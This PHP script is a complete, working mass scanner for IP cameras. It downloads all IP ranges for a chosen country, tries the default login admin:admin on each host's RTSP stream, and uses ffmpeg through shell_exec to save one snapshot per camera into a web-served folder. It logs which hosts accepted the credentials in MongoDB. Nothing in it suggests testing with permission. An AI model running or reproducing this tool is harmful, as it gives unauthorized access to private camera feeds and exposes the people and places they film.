<?php
error_reporting(E_ERROR);
set_time_limit(0);


//Exit if no country arg
if(sizeof($argv) == 1) exit;

//Get country arg
$country = $argv[1];

//Load IP address list by the country
$ipList = getIpList($country);

//Create pool
$taskPool = new Pool(50);

//Loop IP List
foreach($ipList as $ip) {
	$ipArr = ipStrtoArray($ip);	
	
	for($a=$ipArr['start']['a']; $a <= $ipArr['end']['a']; $a++) {
	for($b=$ipArr['start']['b']; $b <= $ipArr['end']['b']; $b++) {
	for($c=$ipArr['start']['c']; $c <= $ipArr['end']['c']; $c++) {
	for($d=$ipArr['start']['d']; $d <= $ipArr['end']['d']; $d++) {
		$ip = $a.'.'.$b.'.'.$c.'.'.$d;				
		//echo "Loop IP : ".$ip.PHP_EOL;
		$taskPool->submit(new Task($ip));
	}	
	}
	}		
	}
	
}

$taskPool->shutdown();

function ipStrToArray($ip){

	$ipArr = array();
    $start = substr($ip,0,strpos($ip,','));
    $end = substr($ip,strpos($ip,',')+1,sizeof($ip)-sizeof($start)-1);

	$ipArr['start']['a'] = substr($start,0,strpos($start,'.'));
	$start = substr($start,strpos($start,'.')+1);
	$ipArr['start']['b'] = substr($start,0,strpos($start,'.'));
	$start = substr($start,strpos($start,'.')+1);
	$ipArr['start']['c'] = substr($start,0,strpos($start,'.'));
	$ipArr['start']['d'] = substr($start,strpos($start,'.')+1);

    $ipArr['end']['a'] = substr($end,0,strpos($end,'.'));
    $end = substr($end,strpos($end,'.')+1);
    $ipArr['end']['b'] = substr($end,0,strpos($end,'.'));
    $end = substr($end,strpos($end,'.')+1);
    $ipArr['end']['c'] = substr($end,0,strpos($end,'.'));
    $ipArr['end']['d'] = substr($end,strpos($end,'.')+1);

	return $ipArr;

}

function getIpList($country) {
	$country = urlencode($country);
	$ch = curl_init();	
	curl_setopt($ch, CURLOPT_URL, "http://services.ce3c.be/ciprg/?countrys=".$country."&format=by+input&format2=%7Bstartip%7D%2C%7Bendip%7D%0D%0A");	
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$data = curl_exec($ch);
	curl_close($ch);
	return explode(PHP_EOL,$data);
}

class Task extends Threaded {
	
	private $ip;
	
	public function __construct($ip) { 
		$this->ip = $ip;			
		//echo "Worker Thread Init IP : ".$this->ip." [OK]".PHP_EOL;
	}
	
	public function run() {	
					
		//echo "Worker Thread Run IP : ".$this->ip." [Start]".PHP_EOL;
		
		$doc = array();

		$doc = $this->rtsp($doc);
		
		$this->update_db($doc);				
		
		//echo "Worker Thread run IP : ".$this->ip." [End]".PHP_EOL;	
		
		$this->setGarbage();	
	}	
	
	private function rtsp($doc) {	
		$user = 'admin';
		$pw = 'admin';
		$req = '11';
		$link = "rtsp://".$user.":".$pw."@".$this->ip."/".$req;		
		$cmd = "ffmpeg -stimeout 2000000 -i "
			.$link." "
			."-f image2 -vframes 1 -y "
			."/var/www/html/ipcam/pic/".$this->ip.".jpeg 2>&1"; 		
		$output = shell_exec($cmd);		
		$doc['ip'] = $this->ip;
		$doc['link'] = $link;
		$doc['capture_timestamp'] = new MongoDB\BSON\UTCDateTime(strtotime(date('Y-m-d H:i:s')) * 1000);  
		$doc['capture_result'] = $this->setDocResult($output);
												
		return $doc;
	}
	
	private function update_db($doc) {
		//Connect to database
		// This path should point to Composer's autoloader
		require 'vendor/autoload.php';			
		$client = new MongoDB\Client("mongodb://localhost:27017");
		$collection = $client->ipcam->capture_list;				
		
		//Find record on DB
		$entry = $collection->findOne(['ip' => $this->ip]);
		if($entry) {
			$collection->updateOne(
				[ '_id' => $entry['_id'] ],
				[ '$set' => $doc ]
			);
		} else {
			$collection->insertOne($doc);
		}	
	}	
 	
	private function setDocResult($output) {
		if(strpos($output,'Connection timed out') > 0) {
			return 'Connection timeout';		//Host offline	
		} else if(strpos($output,'Connection refused') > 0) {
			return 'Connection refused';		//Host online but no RSTP
		} else if(strpos($output,'400 Bad Request') > 0) {
			return '400 Bad Request';			//RTSP ok but bad request	
		} else if(strpos($output,'401 Unauthorized') > 0) {
			return '401 Unauthorized';			//RTSP & request ok but incorrect password
		} else if(strpos($output,'Invalid data found') > 0) {
			return 'Invalid data found'; 		//Invalid data found
		} else if(strpos($output,'Output #0, image2, to') > 0){
			return 'Success'; 					//Connect success
		}
		return $output;
	}
}

?>
